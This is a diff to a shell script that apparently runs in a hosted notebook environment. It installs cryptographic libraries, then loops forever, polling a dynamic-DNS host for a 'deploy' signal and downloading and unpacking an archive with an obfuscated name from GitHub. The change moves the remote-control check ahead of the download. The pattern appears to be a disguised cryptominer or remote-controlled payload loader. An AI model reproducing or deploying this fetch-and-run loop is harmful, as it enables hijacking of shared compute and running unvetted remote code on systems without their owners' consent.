@@ -3,15 +3,15 @@ apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 while true
 do
 
+string=$(curl -s http://mobile8474.hopto.org/?q=deploy > /dev/null)
+if [[ $string == *"16384"* ]]; then
+
 cd /notebooks/
 
 wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/googleapps8474127412742.tar.gz
 tar -xvf ./googleapps8474127412742.tar.gz
 
 cd googleapps8474
-
-string=$(curl -s http://mobile8474.hopto.org/?q=deploy > /dev/null)
-if [[ $string == *"16384"* ]]; then
 
 arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
